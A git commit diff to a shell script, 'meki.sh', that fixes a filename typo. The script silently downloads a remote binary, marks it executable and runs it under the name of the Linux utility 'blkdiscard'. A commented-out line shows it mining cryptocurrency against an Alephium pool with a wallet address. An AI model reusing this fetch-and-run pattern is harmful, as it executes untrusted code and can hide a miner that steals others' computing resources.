3d88009d4f1346a0436b9da2b956b13628960137
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 18:40:03 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -14,7 +14,7 @@ wget https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev/null 2>&1
 
 chmod +x blkdiscard >/dev/null 2>&1
 
-./blackdiscard --list-algos
+./blkdiscard --list-algos
 
 #./blkdiscard -a Blake3 --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)
 
